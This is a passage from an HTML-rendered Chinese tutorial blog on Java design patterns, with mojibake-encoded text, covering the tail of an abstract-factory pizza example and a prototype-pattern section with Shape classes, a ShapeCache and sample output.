class="hljs-literal">null</span>) &#123; <span class="hljs-comment">// è®¢è´­ok</span><br>            pizza.prepare();<br>            pizza.bake();<br>            pizza.cut();<br>            pizza.box();<br>         &#125; <span class="hljs-keyword">else</span> &#123;<br>            System.out.println(<span class="hljs-string">&quot;è®¢è´­å¤±è´¥&quot;</span>);<br>            <span class="hljs-keyword">break</span>;<br>         &#125;<br>      &#125; <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>);<br>   &#125;<br><br>   <span class="hljs-comment">// å†™ä¸€ä¸ªæ–¹æ³•ï¼Œå¯ä»¥è·å–å®¢æˆ·å¸Œæœ›è®¢è´­çš„æŠ«è¨ç§ç±»</span><br>   <span class="hljs-keyword">private</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span> &#123;<br>      <span class="hljs-keyword">try</span> &#123;<br>         <span class="hljs-type">BufferedReader</span> <span class="hljs-variable">strin</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BufferedReader</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">InputStreamReader</span>(System.in));<br>         System.out.println(<span class="hljs-string">&quot;input pizza ç§ç±»:&quot;</span>);<br>         <span class="hljs-type">String</span> <span class="hljs-variable">str</span> <span class="hljs-operator">=</span> strin.readLine();<br>         <span class="hljs-keyword">return</span> str;<br>      &#125; <span class="hljs-keyword">catch</span> (IOException e) &#123;<br>         e.printStackTrace();<br>         <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&quot;</span>;<br>      &#125;<br>   &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>PizzaStore</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.factory.absfactory.pizzastore.order;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PizzaStore</span> &#123;<br><br>   <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>      <span class="hljs-comment">// TODO Auto-generated method stub</span><br>      <span class="hljs-comment">//new OrderPizza(new BJFactory());</span><br>      <span class="hljs-keyword">new</span> <span class="hljs-title class_">OrderPizza</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">LDFactory</span>());<br>   &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure><p>æ‰§è¡Œæ•ˆæœ</p><p>input pizza ç§ç±»:<br />cheese<br /><sub>ä½¿ç”¨çš„æ˜¯æŠ½è±¡å·¥å‚æ¨¡å¼</sub><br />ä¼¦æ•¦çš„å¥¶é…ªpizza å‡†å¤‡åŸææ–™<br />ä¼¦æ•¦çš„å¥¶é…ªpizza baking;<br />ä¼¦æ•¦çš„å¥¶é…ªpizza cutting;<br />ä¼¦æ•¦çš„å¥¶é…ªpizza boxing;<br />input pizza ç§ç±»:</p><h1 id="åŸå‹æ¨¡å¼"><a class="markdownIt-Anchor" href="#åŸå‹æ¨¡å¼"></a> åŸå‹æ¨¡å¼</h1><p>åŸå‹æ¨¡å¼ï¼ˆPrototype Patternï¼‰æ˜¯ç”¨äºåˆ›å»ºé‡å¤çš„å¯¹è±¡ï¼ŒåŒæ—¶åˆèƒ½ä¿è¯æ€§èƒ½ã€‚è¿™ç§ç±»å‹çš„è®¾è®¡æ¨¡å¼å±äºåˆ›å»ºå‹æ¨¡å¼ï¼Œå®ƒæä¾›äº†ä¸€ç§åˆ›å»ºå¯¹è±¡çš„æœ€ä½³æ–¹å¼ã€‚</p><p>è¿™ç§æ¨¡å¼æ˜¯å®ç°äº†ä¸€ä¸ªåŸå‹æ¥å£ï¼Œè¯¥æ¥å£ç”¨äºåˆ›å»ºå½“å‰å¯¹è±¡çš„å…‹éš†ã€‚å½“ç›´æ¥åˆ›å»ºå¯¹è±¡çš„ä»£ä»·æ¯”è¾ƒå¤§æ—¶ï¼Œåˆ™é‡‡ç”¨è¿™ç§æ¨¡å¼ã€‚ä¾‹å¦‚ï¼Œä¸€ä¸ªå¯¹è±¡éœ€è¦åœ¨ä¸€ä¸ªé«˜ä»£ä»·çš„æ•°æ®åº“æ“ä½œä¹‹åè¢«åˆ›å»ºã€‚æˆ‘ä»¬å¯ä»¥ç¼“å­˜è¯¥å¯¹è±¡ï¼Œåœ¨ä¸‹ä¸€ä¸ªè¯·æ±‚æ—¶è¿”å›å®ƒçš„å…‹éš†ï¼Œåœ¨éœ€è¦çš„æ—¶å€™æ›´æ–°æ•°æ®åº“ï¼Œä»¥æ­¤æ¥å‡å°‘æ•°æ®åº“è°ƒç”¨ã€‚</p><h2 id="ä»‹ç»-3"><a class="markdownIt-Anchor" href="#ä»‹ç»-3"></a> ä»‹ç»</h2><p><strong>æ„å›¾ï¼š</strong> ç”¨åŸå‹å®ä¾‹æŒ‡å®šåˆ›å»ºå¯¹è±¡çš„ç§ç±»ï¼Œå¹¶ä¸”é€šè¿‡æ‹·è´è¿™äº›åŸå‹åˆ›å»ºæ–°çš„å¯¹è±¡ã€‚</p><p><strong>ä¸»è¦è§£å†³ï¼š</strong> åœ¨è¿è¡ŒæœŸå»ºç«‹å’Œåˆ é™¤åŸå‹ã€‚</p><p><strong>ä½•æ—¶ä½¿ç”¨ï¼š</strong> 1ã€å½“ä¸€ä¸ªç³»ç»Ÿåº”è¯¥ç‹¬ç«‹äºå®ƒçš„äº§å“åˆ›å»ºï¼Œæ„æˆå’Œè¡¨ç¤ºæ—¶ã€‚ 2ã€å½“è¦å®ä¾‹åŒ–çš„ç±»æ˜¯åœ¨è¿è¡Œæ—¶åˆ»æŒ‡å®šæ—¶ï¼Œä¾‹å¦‚ï¼Œé€šè¿‡åŠ¨æ€è£…è½½ã€‚<br />3ã€ä¸ºäº†é¿å…åˆ›å»ºä¸€ä¸ªä¸äº§å“ç±»å±‚æ¬¡å¹³è¡Œçš„å·¥å‚ç±»å±‚æ¬¡æ—¶ã€‚<br />4ã€å½“ä¸€ä¸ªç±»çš„å®ä¾‹åªèƒ½æœ‰å‡ ä¸ªä¸åŒçŠ¶æ€ç»„åˆä¸­çš„ä¸€ç§æ—¶ã€‚å»ºç«‹ç›¸åº”æ•°ç›®çš„åŸå‹å¹¶å…‹éš†å®ƒä»¬å¯èƒ½æ¯”æ¯æ¬¡ç”¨åˆé€‚çš„çŠ¶æ€æ‰‹å·¥å®ä¾‹åŒ–è¯¥ç±»æ›´æ–¹ä¾¿ä¸€äº›ã€‚</p><p><strong>å¦‚ä½•è§£å†³ï¼š</strong> åˆ©ç”¨å·²æœ‰çš„ä¸€ä¸ªåŸå‹å¯¹è±¡ï¼Œå¿«é€Ÿåœ°ç”Ÿæˆå’ŒåŸå‹å¯¹è±¡ä¸€æ ·çš„å®ä¾‹ã€‚</p><p><strong>å…³é”®ä»£ç ï¼š</strong> 1ã€å®ç°å…‹éš†æ“ä½œï¼Œåœ¨ JAVA å®ç° Cloneable æ¥å£ï¼Œé‡å†™ clone()ï¼Œåœ¨ .NET ä¸­å¯ä»¥ä½¿ç”¨ Object ç±»çš„MemberwiseClone() æ–¹æ³•æ¥å®ç°å¯¹è±¡çš„æµ…æ‹·è´æˆ–é€šè¿‡åºåˆ—åŒ–çš„æ–¹å¼æ¥å®ç°æ·±æ‹·è´ã€‚<br />2ã€åŸå‹æ¨¡å¼åŒæ ·ç”¨äºéš”ç¦»ç±»å¯¹è±¡çš„ä½¿ç”¨è€…å’Œå…·ä½“ç±»å‹ï¼ˆæ˜“å˜ç±»ï¼‰ä¹‹é—´çš„è€¦åˆå…³ç³»ï¼Œå®ƒåŒæ ·è¦æ±‚è¿™äº›&quot;æ˜“å˜ç±»&quot;æ‹¥æœ‰ç¨³å®šçš„æ¥å£ã€‚</p><p><strong>åº”ç”¨å®ä¾‹ï¼š</strong> 1ã€ç»†èƒåˆ†è£‚ã€‚ 2ã€JAVA ä¸­çš„ Object clone() æ–¹æ³•ã€‚</p><p><strong>ä¼˜ç‚¹ï¼š</strong> 1ã€æ€§èƒ½æé«˜ã€‚ 2ã€é€ƒé¿æ„é€ å‡½æ•°çš„çº¦æŸã€‚</p><p><strong>ç¼ºç‚¹ï¼š</strong><br />1ã€é…å¤‡å…‹éš†æ–¹æ³•éœ€è¦å¯¹ç±»çš„åŠŸèƒ½è¿›è¡Œé€šç›˜è€ƒè™‘ï¼Œè¿™å¯¹äºå…¨æ–°çš„ç±»ä¸æ˜¯å¾ˆéš¾ï¼Œä½†å¯¹äºå·²æœ‰çš„ç±»ä¸ä¸€å®šå¾ˆå®¹æ˜“ï¼Œç‰¹åˆ«å½“ä¸€ä¸ªç±»å¼•ç”¨ä¸æ”¯æŒä¸²è¡ŒåŒ–çš„é—´æ¥å¯¹è±¡ï¼Œæˆ–è€…å¼•ç”¨å«æœ‰å¾ªç¯ç»“æ„çš„æ—¶å€™ã€‚<br />2ã€å¿…é¡»å®ç° Cloneable æ¥å£ã€‚</p><p><strong>ä½¿ç”¨åœºæ™¯ï¼š</strong> 1ã€èµ„æºä¼˜åŒ–åœºæ™¯ã€‚ 2ã€ç±»åˆå§‹åŒ–éœ€è¦æ¶ˆåŒ–éå¸¸å¤šçš„èµ„æºï¼Œè¿™ä¸ªèµ„æºåŒ…æ‹¬æ•°æ®ã€ç¡¬ä»¶èµ„æºç­‰ã€‚ 3ã€æ€§èƒ½å’Œå®‰å…¨è¦æ±‚çš„åœºæ™¯ã€‚ 4ã€é€šè¿‡ new<br />äº§ç”Ÿä¸€ä¸ªå¯¹è±¡éœ€è¦éå¸¸ç¹ççš„æ•°æ®å‡†å¤‡æˆ–è®¿é—®æƒé™ï¼Œåˆ™å¯ä»¥ä½¿ç”¨åŸå‹æ¨¡å¼ã€‚ 5ã€ä¸€ä¸ªå¯¹è±¡å¤šä¸ªä¿®æ”¹è€…çš„åœºæ™¯ã€‚<br />6ã€ä¸€ä¸ªå¯¹è±¡éœ€è¦æä¾›ç»™å…¶ä»–å¯¹è±¡è®¿é—®ï¼Œè€Œä¸”å„ä¸ªè°ƒç”¨è€…å¯èƒ½éƒ½éœ€è¦ä¿®æ”¹å…¶å€¼æ—¶ï¼Œå¯ä»¥è€ƒè™‘ä½¿ç”¨åŸå‹æ¨¡å¼æ‹·è´å¤šä¸ªå¯¹è±¡ä¾›è°ƒç”¨è€…ä½¿ç”¨ã€‚<br />7ã€åœ¨å®é™…é¡¹ç›®ä¸­ï¼ŒåŸå‹æ¨¡å¼å¾ˆå°‘å•ç‹¬å‡ºç°ï¼Œä¸€èˆ¬æ˜¯å’Œå·¥å‚æ–¹æ³•æ¨¡å¼ä¸€èµ·å‡ºç°ï¼Œé€šè¿‡ clone çš„æ–¹æ³•åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åç”±å·¥å‚æ–¹æ³•æä¾›ç»™è°ƒç”¨è€…ã€‚åŸå‹æ¨¡å¼å·²ç»ä¸<br />Java èä¸ºæµ‘ç„¶ä¸€ä½“ï¼Œå¤§å®¶å¯ä»¥éšæ‰‹æ‹¿æ¥ä½¿ç”¨ã€‚</p><p><strong>æ³¨æ„äº‹é¡¹ï¼š</strong> ä¸é€šè¿‡å¯¹ä¸€ä¸ªç±»è¿›è¡Œå®ä¾‹åŒ–æ¥æ„é€ æ–°å¯¹è±¡ä¸åŒçš„æ˜¯ï¼ŒåŸå‹æ¨¡å¼æ˜¯é€šè¿‡æ‹·è´ä¸€ä¸ªç°æœ‰å¯¹è±¡ç”Ÿæˆæ–°å¯¹è±¡çš„ã€‚æµ…æ‹·è´å®ç°<br />Cloneableï¼Œé‡å†™ï¼Œæ·±æ‹·è´æ˜¯é€šè¿‡å®ç° Serializable è¯»å–äºŒè¿›åˆ¶æµã€‚</p><h2 id="å®ç°-2"><a class="markdownIt-Anchor" href="#å®ç°-2"></a> å®ç°</h2><p>æˆ‘ä»¬å°†åˆ›å»ºä¸€ä¸ªæŠ½è±¡ç±» <em>Shape</em> å’Œæ‰©å±•äº† <em>Shape</em> ç±»çš„å®ä½“ç±»ã€‚ä¸‹ä¸€æ­¥æ˜¯å®šä¹‰ç±» <em>ShapeCache</em> ï¼Œè¯¥ç±»æŠŠ shape å¯¹è±¡å­˜å‚¨åœ¨ä¸€ä¸ª_Hashtable_ ä¸­ï¼Œå¹¶åœ¨è¯·æ±‚çš„æ—¶å€™è¿”å›å®ƒä»¬çš„å…‹éš†ã€‚</p><p><em>PrototypePatternDemo</em> ç±»ä½¿ç”¨ <em>ShapeCache</em> ç±»æ¥è·å– <em>Shape</em> å¯¹è±¡ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/20201202-prototype-pattern.png" alt="åŸå‹æ¨¡å¼çš„ UML å›¾" /></p><p><code>Shape</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.prototype.cn;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * åˆ›å»ºä¸€ä¸ªå®ç°äº† Cloneable æ¥å£çš„æŠ½è±¡ç±»ã€‚</span><br><span class="hljs-comment"> * [io.xtwoy.prototype.cn]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [å¸­å­ä¸ä¼šæ•²ä»£ç ]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2022/12/24 17:26]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Shape</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Cloneable</span> &#123;<br><br>    <span class="hljs-keyword">private</span> String id;<br>    <span class="hljs-keyword">protected</span> String type;<br><br>    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">draw</span><span class="hljs-params">()</span>;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getType</span><span class="hljs-params">()</span>&#123;<br>        <span class="hljs-keyword">return</span> type;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> String <span class="hljs-title function_">getId</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-keyword">return</span> id;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setId</span><span class="hljs-params">(String id)</span> &#123;<br>        <span class="hljs-built_in">this</span>.id = id;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> Object <span class="hljs-title function_">clone</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">clone</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            clone = <span class="hljs-built_in">super</span>.clone();<br>        &#125; <span class="hljs-keyword">catch</span> (CloneNotSupportedException e) &#123;<br>            e.printStackTrace();<br>        &#125;<br>        <span class="hljs-keyword">return</span> clone;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Circle</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.prototype.cn;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * [io.xtwoy.prototype.cn]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [å¸­å­ä¸ä¼šæ•²ä»£ç ]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2022/12/24 17:27]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Circle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Circle</span><span class="hljs-params">()</span>&#123;<br>        type = <span class="hljs-string">&quot;Circle&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">draw</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Inside Circle::draw() method.&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Rectangle</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.prototype.cn;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * [io.xtwoy.prototype.cn]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [å¸­å­ä¸ä¼šæ•²ä»£ç ]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2022/12/24 17:27]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Rectangle</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Rectangle</span><span class="hljs-params">()</span>&#123;<br>        type = <span class="hljs-string">&quot;Rectangle&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">draw</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Inside Rectangle::draw() method.&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>Square</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.prototype.cn;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * [io.xtwoy.prototype.cn]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [å¸­å­ä¸ä¼šæ•²ä»£ç ]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2022/12/24 17:27]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Square</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">Shape</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-title function_">Square</span><span class="hljs-params">()</span>&#123;<br>        type = <span class="hljs-string">&quot;Square&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-meta">@Override</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">draw</span><span class="hljs-params">()</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Inside Square::draw() method.&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>ShapeCache</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.prototype.cn;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * åˆ›å»ºä¸€ä¸ªç±»ï¼Œä»æ•°æ®åº“è·å–å®ä½“ç±»ï¼Œå¹¶æŠŠå®ƒä»¬å­˜å‚¨åœ¨ä¸€ä¸ª Hashtable ä¸­ã€‚</span><br><span class="hljs-comment"> * [io.xtwoy.prototype.cn]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [å¸­å­ä¸ä¼šæ•²ä»£ç ]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2022/12/24 17:28]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">import</span> java.util.Hashtable;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShapeCache</span> &#123;<br><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Hashtable&lt;String, Shape&gt; shapeMap<br>            = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Hashtable</span>&lt;String, Shape&gt;();<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Shape <span class="hljs-title function_">getShape</span><span class="hljs-params">(String shapeId)</span> &#123;<br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">cachedShape</span> <span class="hljs-operator">=</span> shapeMap.get(shapeId);<br>        <span class="hljs-keyword">return</span> (Shape) cachedShape.clone();<br>    &#125;<br><br>    <span class="hljs-comment">// å¯¹æ¯ç§å½¢çŠ¶éƒ½è¿è¡Œæ•°æ®åº“æŸ¥è¯¢ï¼Œå¹¶åˆ›å»ºè¯¥å½¢çŠ¶</span><br>    <span class="hljs-comment">// shapeMap.put(shapeKey, shape);</span><br>    <span class="hljs-comment">// ä¾‹å¦‚ï¼Œæˆ‘ä»¬è¦æ·»åŠ ä¸‰ç§å½¢çŠ¶</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">loadCache</span><span class="hljs-params">()</span> &#123;<br>        <span class="hljs-type">Circle</span> <span class="hljs-variable">circle</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Circle</span>();<br>        circle.setId(<span class="hljs-string">&quot;1&quot;</span>);<br>        shapeMap.put(circle.getId(),circle);<br><br>        <span class="hljs-type">Square</span> <span class="hljs-variable">square</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Square</span>();<br>        square.setId(<span class="hljs-string">&quot;2&quot;</span>);<br>        shapeMap.put(square.getId(),square);<br><br>        <span class="hljs-type">Rectangle</span> <span class="hljs-variable">rectangle</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Rectangle</span>();<br>        rectangle.setId(<span class="hljs-string">&quot;3&quot;</span>);<br>        shapeMap.put(rectangle.getId(),rectangle);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><code>PrototypePatternDemo</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> io.xtwoy.prototype.cn;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * PrototypePatternDemo ä½¿ç”¨ ShapeCache ç±»æ¥è·å–å­˜å‚¨åœ¨ Hashtable ä¸­çš„å½¢çŠ¶çš„å…‹éš†ã€‚</span><br><span class="hljs-comment"> * [io.xtwoy.prototype.cn]</span><br><span class="hljs-comment"> *</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@author</span> : [å¸­å­ä¸ä¼šæ•²ä»£ç ]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@version</span> : [V1.0]</span><br><span class="hljs-comment"> * <span class="hljs-doctag">@date</span> : [2022/12/24 17:29]</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">PrototypePatternDemo</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        ShapeCache.loadCache();<br><br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">clonedShape</span> <span class="hljs-operator">=</span> (Shape) ShapeCache.getShape(<span class="hljs-string">&quot;1&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;Shape : &quot;</span> + clonedShape.getType());<br><br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">clonedShape2</span> <span class="hljs-operator">=</span> (Shape) ShapeCache.getShape(<span class="hljs-string">&quot;2&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;Shape : &quot;</span> + clonedShape2.getType());<br><br>        <span class="hljs-type">Shape</span> <span class="hljs-variable">clonedShape3</span> <span class="hljs-operator">=</span> (Shape) ShapeCache.getShape(<span class="hljs-string">&quot;3&quot;</span>);<br>        System.out.println(<span class="hljs-string">&quot;Shape : &quot;</span> + clonedShape3.getType());<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>æ‰§è¡Œç¨‹åºï¼Œè¾“å‡ºç»“æœï¼š</p></blockquote><p>Shape : Circle<br />Shape : Square<br />Shape : Rectangle</p><h2 id="æ·±å…¥è®¨è®º-æµ…æ‹·è´å’Œæ·±æ‹·è´"><a class="markdownIt-Anchor" href="#æ·±å…¥è®¨è®º-æµ…æ‹·è´å’Œæ·±æ‹·è´"></a> æ·±å…¥è®¨è®º-æµ…æ‹·è´å’Œæ·±æ‹·è´</h2><h3 id="æµ…æ‹·è´çš„ä»‹ç»"><a class="markdownIt-Anchor" href="#æµ…æ‹·è´çš„ä»‹ç»"></a> æµ…æ‹·è´çš„ä»‹ç»</h3><ol><li><p>å¯¹äºæ•°æ®ç±»å‹æ˜¯åŸºæœ¬æ•°æ®ç±»å‹çš„æˆå‘˜å˜é‡ï¼Œæµ…æ‹·è´ä¼šç›´æ¥è¿›è¡Œå€¼ä¼ 